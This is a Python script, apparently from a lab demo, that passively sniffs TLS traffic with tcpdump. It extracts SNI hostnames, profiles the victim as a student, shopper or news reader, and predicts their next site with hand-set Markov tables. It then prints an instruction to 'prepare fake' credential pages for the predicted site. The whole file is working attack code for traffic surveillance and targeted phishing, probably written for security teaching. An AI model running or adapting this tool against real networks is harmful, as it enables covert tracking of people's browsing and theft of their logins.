#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
attack.py -- Live SNI persona classifier and next-hop predictor.

Runs on Attacker VM. 
Spawns tcpdump, reads the live pcap stream, detects session boundaries, classifies the active user persona, 
and predicts where they will go next.

Python 2.7 compatible (Ubuntu 12.04).

Usage (run from scripts/):
    sudo python attack.py

High-level flow:
  1. Spawn tcpdump to capture raw TLS packets from the network
  2. Parse the pcap stream in real time to extract SNI hostnames
  3. Group SNIs into sessions using timing gaps (gap > SESSION_GAP = new session)
  4. After each new SNI, classify the user persona (student / shopper / news_reader)
  5. Predict where they will go next using the per-persona Markov table
  6. Print the session state, persona guess, and top-3 predictions to the terminal
"""

from __future__ import print_function
import os
import struct
import subprocess
import sys

# parse_sni.py lives in the same folder. Add it to the path so we can import
# its pcap-parsing functions directly rather than duplicating them here.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import parse_sni

# ---------------------------------------------------------------------------
# Hardcoded models
#
# These stand in for trained pkl files until train.py is written.
# The classifier is a simple SNI-to-persona lookup table.
# The Markov tables encode "given I just visited X, where do I go next?"
#
# To swap in real trained models, replace the CLASSIFIER and MARKOV
# assignments below with:
#
#   import pickle
#   CLASSIFIER = pickle.load(open('../models/classifier.pkl', 'rb'))
#   MARKOV     = pickle.load(open('../models/markov.pkl',     'rb'))
#
# The rest of the code is identical either way — the dict structure is the same.
# ---------------------------------------------------------------------------

# SNIs that appear across all personas and carry no discriminative signal.
# The classifier ignores these when voting.
SHARED = {'google.com', 'reddit.com'}

# Maps each persona-exclusive SNI to its persona label.
# Every SNI the victim visits gets looked up here. If it's exclusive to one
# persona, it casts a vote for that persona in the classifier.
CLASSIFIER = {
    # student -- Purdue academic sites
    'purdue.edu':               'student',
    'mail.purdue.edu':          'student',
    'purdue.brightspace.com':   'student',
    'piazza.com':               'student',
    'gradescope.com':           'student',
    'edstem.org':               'student',
    'vocareum.com':             'student',
    'lib.purdue.edu':           'student',
    'mypurdue.purdue.edu':      'student',
    # shopper -- retail and payment sites
    'amazon.com':               'shopper',
    'ebay.com':                 'shopper',
    'walmart.com':              'shopper',
    'paypal.com':               'shopper',
    'bestbuy.com':              'shopper',
    'target.com':               'shopper',
    'etsy.com':                 'shopper',
    'craigslist.org':           'shopper',
    'venmo.com':                'shopper',
    # news_reader -- news outlets
    'cnn.com':                  'news_reader',
    'bbc.com':                  'news_reader',
    'reuters.com':              'news_reader',
    'nytimes.com':              'news_reader',
    'apnews.com':               'news_reader',
    'theguardian.com':          'news_reader',
    'foxnews.com':              'news_reader',
    'npr.org':                  'news_reader',
}

# Per-persona first-order Markov transition tables.
#
# Structure: {persona: {current_sni: {next_sni: probability}}}
#
# Each inner dict is a probability distribution over the next SNI given the
# current one. Values sum to 1.0 per row. These were set by hand to reflect
# realistic browsing patterns (e.g. amazon -> paypal is a natural checkout flow).
#
# If the current SNI has no row in the table (e.g. it was not seen often during
# training), the predictor falls back to a flat uniform distribution over all
# SNIs in that persona's vocabulary.
MARKOV = {
    'student': {
        # From the main portal, students typically go to their LMS or email
        'purdue.edu':             {'purdue.brightspace.com': 0.40, 'mail.purdue.edu': 0.25, 'mypurdue.purdue.edu': 0.20, 'lib.purdue.edu': 0.15},
        # From email, grading and coursework tools are the likely next stop
        'mail.purdue.edu':        {'gradescope.com': 0.40, 'purdue.brightspace.com': 0.30, 'purdue.edu': 0.20, 'piazza.com': 0.10},
        # From Brightspace (LMS), students go to coding/Q&A platforms
        'purdue.brightspace.com': {'edstem.org': 0.35, 'gradescope.com': 0.30, 'piazza.com': 0.20, 'vocareum.com': 0.15},
        # From edstem, the natural next step is the cloud lab (vocareum) or Q&A
        'edstem.org':             {'vocareum.com': 0.50, 'piazza.com': 0.25, 'purdue.brightspace.com': 0.25},
        'gradescope.com':         {'purdue.brightspace.com': 0.45, 'edstem.org': 0.30, 'piazza.com': 0.25},
        'piazza.com':             {'purdue.brightspace.com': 0.40, 'edstem.org': 0.35, 'gradescope.com': 0.25},
        'vocareum.com':           {'edstem.org': 0.55, 'purdue.brightspace.com': 0.30, 'gradescope.com': 0.15},
        'mypurdue.purdue.edu':    {'purdue.brightspace.com': 0.50, 'mail.purdue.edu': 0.30, 'purdue.edu': 0.20},
        'lib.purdue.edu':         {'purdue.edu': 0.45, 'purdue.brightspace.com': 0.35, 'edstem.org': 0.20},
    },
    'shopper': {
        # Amazon is the hub -- most transitions lead through or back to it
        'amazon.com':       {'paypal.com': 0.40, 'ebay.com': 0.25, 'walmart.com': 0.20, 'bestbuy.com': 0.15},
        # eBay sessions often end at a payment processor
        'ebay.com':         {'paypal.com': 0.50, 'amazon.com': 0.25, 'craigslist.org': 0.15, 'venmo.com': 0.10},
        # After paying, shoppers return to browse more
        'paypal.com':       {'amazon.com': 0.40, 'ebay.com': 0.35, 'venmo.com': 0.25},
        'walmart.com':      {'amazon.com': 0.45, 'target.com': 0.30, 'bestbuy.com': 0.25},
        'bestbuy.com':      {'amazon.com': 0.50, 'walmart.com': 0.30, 'ebay.com': 0.20},
        'target.com':       {'amazon.com': 0.45, 'walmart.com': 0.35, 'paypal.com': 0.20},
        'etsy.com':         {'paypal.com': 0.55, 'amazon.com': 0.25, 'ebay.com': 0.20},
        'craigslist.org':   {'ebay.com': 0.45, 'paypal.com': 0.35, 'amazon.com': 0.20},
        'venmo.com':        {'paypal.com': 0.50, 'amazon.com': 0.30, 'ebay.com': 0.20},
    },
    'news_reader': {
        # News readers hop between outlets -- no single dominant next-hop
        'cnn.com':          {'bbc.com': 0.25, 'nytimes.com': 0.25, 'apnews.com': 0.20, 'foxnews.com': 0.15, 'reuters.com': 0.15},
        # BBC readers tend toward wire services for more factual follow-up
        'bbc.com':          {'reuters.com': 0.40, 'theguardian.com': 0.30, 'cnn.com': 0.20, 'apnews.com': 0.10},
        'nytimes.com':      {'theguardian.com': 0.40, 'reuters.com': 0.25, 'bbc.com': 0.20, 'apnews.com': 0.15},
        'reuters.com':      {'bbc.com': 0.35, 'apnews.com': 0.30, 'nytimes.com': 0.25, 'cnn.com': 0.10},
        'apnews.com':       {'reuters.com': 0.35, 'bbc.com': 0.30, 'cnn.com': 0.20, 'nytimes.com': 0.15},
        'theguardian.com':  {'bbc.com': 0.45, 'reuters.com': 0.30, 'nytimes.com': 0.25},
        'foxnews.com':      {'cnn.com': 0.40, 'apnews.com': 0.35, 'reuters.com': 0.25},
        'npr.org':          {'apnews.com': 0.40, 'reuters.com': 0.30, 'bbc.com': 0.30},
    },
}

# Build a flat list of all SNIs per persona. Used as the fallback prediction
# pool when the current SNI has no Markov row (uniform distribution).
PERSONA_VOCAB = {
    persona: [sni for sni, p in CLASSIFIER.items() if p == persona]
    for persona in ('student', 'shopper', 'news_reader')
}

INTERFACE   = 'eth14'
SESSION_GAP = 4.0   # seconds — gap larger than this triggers a new session boundary

# ---------------------------------------------------------------------------
# Step 1 & 2 — Stream live SNIs from tcpdump
# ---------------------------------------------------------------------------

def stream_sni(pipe):
    """
    Read a live pcap stream from file-like object `pipe` (tcpdump stdout).
    Yields (timestamp_float, sni_hostname) as TLS ClientHellos arrive.

    This is a streaming adaptation of parse_sni.read_pcap(). Instead of
    opening a file by path, it reads from the pipe tcpdump is writing to,
    so packets are processed as they arrive rather than after capture ends.

    The pcap format starts with a 24-byte global header that tells us the
    byte order and link-layer type, followed by a series of packet records.
    Each record has a 16-byte header (timestamps + length) then the raw frame.
    We strip the link + IP + TCP headers and hand the payload to the TLS parser.
    """
    # Read the global pcap header to determine byte order and link type
    gh = pipe.read(parse_sni.PCAP_GLOBAL_HEADER_LEN)
    if len(gh) < parse_sni.PCAP_GLOBAL_HEADER_LEN:
        return

    magic = struct.unpack('<I', gh[0:4])[0]
    if magic == parse_sni.PCAP_MAGIC_LE:
        endian = '<'
    elif magic == parse_sni.PCAP_MAGIC_BE:
        endian = '>'
    else:
        raise ValueError("Not a pcap stream (bad magic: 0x%x)" % magic)

    link_type = struct.unpack(endian + 'I', gh[20:24])[0]

    # Read packet records one at a time as they arrive from tcpdump
    while True:
        rh = pipe.read(parse_sni.PCAP_RECORD_HEADER_LEN)
        if len(rh) < parse_sni.PCAP_RECORD_HEADER_LEN:
            return  # pipe closed (tcpdump stopped)
        ts_sec, ts_usec, incl_len, _ = struct.unpack(endian + 'IIII', rh)
        data = pipe.read(incl_len)
        if len(data) < incl_len:
            return

        # Convert pcap timestamp to a float (seconds since epoch)
        ts = ts_sec + ts_usec / 1e6

        # Strip link/IP/TCP headers to get the raw TCP payload
        payload = parse_sni.extract_tcp_payload(link_type, data)
        if not payload:
            continue  # not a TCP packet we care about

        # Check if the TCP payload is a TLS ClientHello and extract the SNI
        sni = parse_sni.parse_client_hello_sni(payload)
        if sni:
            yield ts, sni  # hand the caller a (timestamp, hostname) pair

# ---------------------------------------------------------------------------
# Step 3 — Session boundary detection (handled in main loop)
# Step 4 — Classify the user persona
# ---------------------------------------------------------------------------

def classify(seen_snis):
    """
    Determine the most likely persona from the SNIs seen so far in this session.

    Method: frequency vote. Each exclusive SNI casts one vote for its persona.
    Shared SNIs (google.com, reddit.com) are ignored because they appear in
    all personas and would dilute the signal.

    Returns (persona_string, confidence_pct) or (None, 0) if no exclusive
    SNIs have been seen yet (can't classify on shared SNIs alone).

    Confidence is the fraction of exclusive-SNI votes that went to the winner,
    expressed as a percentage. It naturally starts at 100% on the first
    exclusive SNI and drops if cross-persona SNIs are seen later in the session.
    """
    votes = {}
    for sni in seen_snis:
        if sni in SHARED:
            continue  # skip ambiguous SNIs
        persona = CLASSIFIER.get(sni)
        if persona:
            votes[persona] = votes.get(persona, 0) + 1

    if not votes:
        return None, 0  # only shared SNIs seen so far

    winner = max(votes, key=lambda p: votes[p])
    total  = sum(votes.values())
    confidence = int(round(votes[winner] / float(total) * 100))
    return winner, confidence

# ---------------------------------------------------------------------------
# Step 5 — Predict the next destination using the Markov table
# ---------------------------------------------------------------------------

def predict(persona, current_sni, top_n=3):
    """
    Given the classified persona and the most recently seen SNI, return the
    top_n most likely next destinations with their probabilities.

    Looks up the current SNI in that persona's Markov row. If no row exists
    (SNI was rare in training data), falls back to a uniform distribution
    over the persona's full vocabulary so we always return something useful.

    Returns a list of (sni, pct) tuples, ranked highest probability first.
    """
    # Try to find a trained transition row for this SNI under the given persona
    row = MARKOV.get(persona, {}).get(current_sni)

    if row:
        # Trained row found -- rank by probability descending
        ranked = sorted(row.items(), key=lambda x: x[1], reverse=True)
    else:
        # No row -- fall back to uniform distribution over persona vocab
        vocab = PERSONA_VOCAB.get(persona, [])
        if not vocab:
            return []
        p = 1.0 / len(vocab)
        ranked = [(s, p) for s in vocab]

    # Convert probabilities to integer percentages for display
    return [(sni, int(round(prob * 100))) for sni, prob in ranked[:top_n]]

# ---------------------------------------------------------------------------
# Step 6 — Print the current session state to the terminal
# ---------------------------------------------------------------------------

def print_update(session_num, seen, persona, confidence, predictions):
    """
    Print a summary block for the current session after each new SNI arrives.
    Reprints the full session state each time so the attacker can follow along
    as the victim browses hop by hop.
    """
    print('')
    print('[SESSION %d]' % session_num)
    # Show the full chain of SNIs seen so far in this session
    print('  Seen:     %s' % ' -> '.join(seen))
    if persona:
        print('  Persona:  %s (confidence %d%%)' % (persona, confidence))
        if predictions:
            # Show top-3 predictions with their probabilities
            pred_str = ' | '.join('%s (%d%%)' % (s, p) for s, p in predictions)
            print('  Predicts: %s' % pred_str)
            # The top prediction is the phishing target -- attacker acts on this
            print('  -> ACTION: Prepare fake %s credential page' % predictions[0][0])
    else:
        # Not enough signal yet -- waiting for a non-shared SNI
        print('  Persona:  unknown (only shared SNIs seen so far)')
    sys.stdout.flush()  # ensure output appears immediately (no buffering)

# ---------------------------------------------------------------------------
# Main -- wire everything together
# ---------------------------------------------------------------------------

def main():
    # -U flag: write each packet to stdout immediately (packet-buffered mode).
    # Without -U, tcpdump buffers output and packets pile up before reaching us,
    # breaking the "live" feel of the demo.
    cmd = ['tcpdump', '-i', INTERFACE, '-n', '-s', '0', '-U', '-w', '-', 'tcp port 443']

    print('[attack.py] Starting live capture on interface %s' % INTERFACE)
    print('[attack.py] Waiting for TLS traffic... (Ctrl-C to stop)')
    print('')

    # Suppress tcpdump's own startup messages so they don't clutter the output
    devnull = open(os.devnull, 'w')
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=devnull)

    session_num = 0   # increments each time a gap > SESSION_GAP is detected
    seen        = []  # SNIs observed in the current session, in order
    last_ts     = None

    try:
        for ts, sni in stream_sni(proc.stdout):

            # --- Step 3: session boundary detection ---
            # If enough time has passed since the last SNI, the victim has
            # moved on to a new browsing session. Reset state and increment counter.
            if last_ts is not None and (ts - last_ts) > SESSION_GAP:
                session_num += 1
                seen = []

            seen.append(sni)
            last_ts = ts

            # --- Steps 4 & 5: classify and predict ---
            persona, confidence = classify(seen)
            predictions = predict(persona, sni) if persona else []

            # --- Step 6: print the update ---
            print_update(session_num, seen, persona, confidence, predictions)

    except KeyboardInterrupt:
        print('\n[attack.py] Stopped.')
    finally:
        proc.terminate()
        devnull.close()

if __name__ == '__main__':
    main()
